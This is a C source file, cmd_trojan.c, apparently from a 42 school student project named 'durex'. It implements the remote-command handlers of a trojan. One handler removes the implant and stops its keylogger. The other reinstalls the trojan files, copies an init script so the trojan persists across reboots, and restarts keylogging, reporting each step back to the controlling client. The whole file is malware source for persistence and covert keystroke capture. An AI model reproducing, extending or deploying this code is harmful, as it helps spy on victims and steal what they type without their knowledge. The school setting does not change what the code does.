/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cmd_trojan.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/18 16:41:09 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:13:18 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

int			cmd_remove(t_durex *durex, int co)
{
	if (!durex->trojan.removed)
	{
		if (durex->kl.keylogging)
			keylog_stop(durex);
		close_logs(durex);
		if (!remove_trojan_files())
			message_client(durex, co, TROJAN_NAME" had trouble removing itself\n");
		else
			message_client(durex, co, TROJAN_NAME" removed from system\n");
		durex->trojan.removed = 1;
		return (1);
	}
	message_client(durex, co, TROJAN_NAME" already removed from system\n");
	return (1);
}

int			cmd_add(t_durex *durex, int co)
{
	char	*msg;
	char	*msg_init;

	if (!durex->trojan.removed)
		msg = ft_strdup(TROJAN_NAME" already in place\n");
	else if (copy_trojan(&durex->trojan, &msg))
		durex->trojan.removed = 0;
	msg_init = startup_trojan() == 1 ? "Copied init script\n" :
		"Could not copy init script\n";
	open_logs(durex);
	if (!durex->kl.keylogging)
		keylog(durex, -1);
	log_info(durex, msg);
	log_info(durex, msg_init);
	message_client(durex, co, msg);
	message_client(durex, co, msg_init);
	free(msg);
	return (1);
}
